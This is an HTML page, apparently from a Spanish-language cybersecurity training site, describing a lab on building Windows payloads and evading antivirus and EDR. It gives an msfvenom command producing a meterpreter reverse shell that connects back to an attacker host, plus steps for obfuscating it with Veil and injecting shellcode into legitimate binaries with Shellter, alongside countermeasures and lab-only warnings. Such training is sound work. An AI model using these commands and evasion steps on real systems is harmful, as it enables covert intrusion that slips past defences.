@@ -1,1 +1,276 @@
 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 11 – Análisis de payloads y técnicas de evasión</title>
+  <link rel="icon" href="/el-pergamino-digital/assets/favicon.png" type="image/png" />
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+    }
+    nav {
+      background-color: #1f1f1f;
+      padding: 1em;
+      text-align: center;
+    }
+    nav a {
+      color: #e0e0e0;
+      margin: 0 1em;
+      text-decoration: none;
+    }
+    nav a.activo {
+      font-weight: bold;
+      text-decoration: underline;
+    }
+    h1 {
+      text-align: center;
+      margin-top: 1.5em;
+      color: #ffffff;
+    }
+    .subtitulo {
+      text-align: center;
+      color: #bbbbbb;
+      margin-bottom: 2em;
+    }
+    main {
+      max-width: 900px;
+      margin: auto;
+      padding: 2em;
+    }
+    section {
+      margin-bottom: 2em;
+    }
+    h2 {
+      color: #90caf9;
+    }
+    code {
+      background-color: #1e1e1e;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+    footer {
+      text-align: center;
+      padding: 2em;
+      background-color: #1e1e1e;
+      font-size: 0.9em;
+      color: #aaaaaa;
+    }
+    @media (max-width: 600px) {
+      body { font-size: 1.1em; }
+      h1 { font-size: 1.8em; }
+      .subtitulo { font-size: 1.1em; }
+      nav a { display: block; margin: 0.5em 0; }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="/el-pergamino-digital/index.html">Inicio</a>
+    <a href="/el-pergamino-digital/labs/" class="activo">Laboratorios</a>
+    <a href="/el-pergamino-digital/glosario/">Glosario</a>
+    <a href="/el-pergamino-digital/simulador/">Simulador</a>
+    <a href="/el-pergamino-digital/modulos/">Módulos</a>
+  </nav>
+
+  <h1>Lab 11 – Análisis de payloads y técnicas de evasión</h1>
+  <p class="subtitulo">Construcción, modificación y análisis de payloads con técnicas para evadir antivirus y EDR</p>
+
+  <main>
+    <section>
+      <h2>Objetivo</h2>
+      <p>Comprender cómo se construyen y modifican payloads maliciosos para evadir mecanismos de detección, utilizando técnicas como ofuscación, codificación, esteganografía y empaquetado.</p>
+    </section>
+
+    <section>
+      <h2>Alcance y limitaciones</h2>
+      <p><strong>Alcance:</strong> Generación de payloads con <code>msfvenom</code>, análisis estático y dinámico, pruebas en entornos controlados, comparación de detección con antivirus y EDR.</p>
+      <p><strong>Limitaciones:</strong> No se permite el uso de payloads en sistemas reales. El laboratorio se ejecuta exclusivamente en entornos virtuales aislados.</p>
+      <p><strong>Escenario sugerido:</strong> Kali Linux como atacante, Windows 10 vulnerable con antivirus activo en entorno virtual.</p>
+    </section>
+
+    <section>
+      <h2>Requisitos previos</h2>
+      <ul>
+        <li>Conocimientos básicos de Metasploit, payloads y shellcode</li>
+        <li>Familiaridad con antivirus, EDR y técnicas de evasión</li>
+        <li>Entorno: Kali Linux, Windows 10 virtual, red NAT o interna</li>
+        <li>Herramientas instaladas: <code>msfvenom</code>, <code>Veil</code>, <code>Shellter</code>, <code>obfuscator-llvm</code>, <code>PEStudio</code>, <code>Procmon</code></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Arquitectura del entorno</h2>
+      <pre>[ Kali (192.168.1.10) ] ←→ [ Windows 10 (192.168.1.20) con antivirus activo ]</pre>
+      <p>El payload se genera en Kali y se transfiere a Windows para evaluar su detección y comportamiento.</p>
+    </section>
+
+    <section>
+      <h2>Herramientas y entorno técnico</h2>
+      <ul>
+        <li><strong>msfvenom</strong>: generación de payloads</li>
+        <li><strong>Veil</strong>: evasión de antivirus</li>
+        <li><strong>Shellter</strong>: inyección de shellcode en ejecutables</li>
+        <li><strong>obfuscator-llvm</strong>: ofuscación de código</li>
+        <li><strong>PEStudio</strong>: análisis estático de ejecutables</li>
+        <li><strong>Procmon</strong>: monitoreo de comportamiento en tiempo real</li>
+      </ul>
+    </section>
+
+        <section>
+      <h2>Procedimiento técnico paso a paso</h2>
+      <ol>
+        <li>Generar un payload básico con <code>msfvenom</code>:
+          <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe</code></pre>
+        </li>
+        <li>Analizar el payload con <code>PEStudio</code> para detectar firmas y secciones sospechosas</li>
+        <li>Probar detección con antivirus o VirusTotal</li>
+        <li>Ofuscar el payload con <code>Veil</code>:
+          <pre><code>veil -t Evasion</code></pre>
+        </li>
+        <li>Repetir análisis con PEStudio y antivirus</li>
+        <li>Inyectar shellcode en binario legítimo con <code>Shellter</code></li>
+        <li>Observar comportamiento con <code>Procmon</code> en Windows</li>
+        <li>Comparar detección entre versiones del payload</li>
+      </ol>
+    </section>
+
+    <section>
+      <h2>Resultados esperados</h2>
+      <ul>
+        <li>Payload básico detectado por antivirus</li>
+        <li>Payload ofuscado con menor tasa de detección</li>
+        <li>Payload inyectado con Shellter más difícil de detectar</li>
+        <li>Comportamiento observable en tiempo real con Procmon</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Análisis de resultados</h2>
+      <p>Las técnicas de evasión permiten modificar la estructura del payload sin alterar su funcionalidad. La ofuscación, el empaquetado y la inyección en binarios legítimos son métodos comunes para evadir firmas estáticas. Sin embargo, los EDR modernos aplican análisis de comportamiento, lo que obliga a combinar técnicas.</p>
+    </section>
+
+    <section>
+      <h2>Medidas</h2>
+      <ul>
+        <li>Documentar cada variante del payload y su tasa de detección</li>
+        <li>Clasificar técnicas utilizadas: ofuscación, codificación, inyección, esteganografía</li>
+        <li>Evaluar impacto en funcionalidad y detección</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Contramedidas</h2>
+      <ul>
+        <li>Implementar EDR con análisis de comportamiento</li>
+        <li>Bloquear ejecución de binarios en rutas no autorizadas</li>
+        <li>Aplicar listas blancas de aplicaciones (AppLocker, WDAC)</li>
+        <li>Monitorear procesos y conexiones salientes sospechosas</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Riesgos y advertencias</h2>
+      <p>La creación y modificación de payloads puede ser detectada por soluciones de seguridad. Este laboratorio debe realizarse en entornos virtuales aislados, sin conexión a redes reales. El uso de estas técnicas fuera del laboratorio puede constituir delito.</p>
+    </section>
+
+    <section>
+      <h2>Evidencias</h2>
+      <p><em>Espacio reservado para capturas de pantalla de msfvenom, PEStudio, Veil, Shellter, resultados de detección y análisis de comportamiento.</em></p>
+    </section>
+
+    <section>
+      <h2>Validación cruzada</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1027/" target="_blank">MITRE ATT&CK T1027 – Obfuscated Files or Information</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1055/" target="_blank">MITRE ATT&CK T1055 – Process Injection</a></li>
+        <li><a href="https://www.cisecurity.org/controls/10" target="_blank">CIS Control 10 – Malware Defenses</a></li>
+      </ul>
+    </section>
+
+        <section>
+      <h2>Referencias normativas y técnicas</h2>
+      <ul>
+        <li><a href="https://www.veil-framework.com/" target="_blank">Veil Framework – Evasion Tools</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1027/" target="_blank">MITRE ATT&CK T1027 – Obfuscated Files or Information</a></li>
+        <li><a href="https://www.cisecurity.org/controls/10" target="_blank">CIS Control 10 – Malware Defenses</a></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Certificaciones asociadas</h2>
+      <ul>
+        <li>eJPT / eCPPT – Payload Crafting and AV Evasion</li>
+        <li>OSCP – Post-Exploitation and Antivirus Evasion</li>
+        <li>CompTIA PenTest+ – Domain 3.0: Attacks and Exploits</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Analogía técnica</h2>
+      <p style="font-family: 'Comic Sans MS'; font-size: 12pt;">
+        Un payload sin evasión es como un ladrón con pasamontañas en un banco lleno de cámaras: será detectado en segundos.
+      </p>
+    </section>
+
+    <section>
+      <h2>Nivel de dificultad</h2>
+      <p>Avanzado</p>
+    </section>
+
+    <section>
+      <h2>Checklist final</h2>
+      <ul>
+        <li>[ ] Payload generado con msfvenom</li>
+        <li>[ ] Análisis estático y dinámico realizado</li>
+        <li>[ ] Técnicas de evasión aplicadas (Veil, Shellter, etc.)</li>
+        <li>[ ] Resultados de detección comparados</li>
+        <li>[ ] Validación cruzada registrada</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Navegación transversal</h2>
+      <ul>
+        <li><a href="/el-pergamino-digital/index.html">Portada</a></li>
+        <li><a href="/el-pergamino-digital/glosario/">Glosario</a></li>
+        <li><a href="/el-pergamino-digital/simulador/">Simulador</a></li>
+        <li><a href="/el-pergamino-digital/modulos/">Módulos</a></li>
+        <li><a href="/el-pergamino-digital/labs/">Laboratorios</a></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Reflexión estratégica</h2>
+      <p>El análisis de evasión no busca glorificar el malware, sino entender cómo piensan los atacantes para anticiparse a sus movimientos. Dominar estas técnicas permite fortalecer defensas, evaluar la eficacia de soluciones de seguridad y formar pentesters éticos con visión ofensiva y defensiva.</p>
+    </section>
+
+    <section>
+      <h2>Disclaimer de advertencia</h2>
+      <p><strong>Advertencia:</strong> Este laboratorio está diseñado exclusivamente para fines educativos y debe ejecutarse en entornos controlados. La creación, modificación o ejecución de payloads fuera de un entorno de laboratorio puede constituir una violación legal y ética. El Pergamino Digital no se responsabiliza por el uso indebido de las técnicas aquí descritas.</p>
+    </section>
+  </main>
+
+  <footer>
+    <p>Este laboratorio forma parte del proyecto <a href="https://pergamino-digital-ciberseguridad.blogspot.com/?m=1" target="_blank">El Pergamino Digital</a>, alineado con estándares internacionales y diseñado para fortalecer competencias técnicas en ciberseguridad.</p>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const links = document.querySelectorAll("nav a");
+      links.forEach(link => {
+        if (link.href === window.location.href) {
+          link.classList.add("activo");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
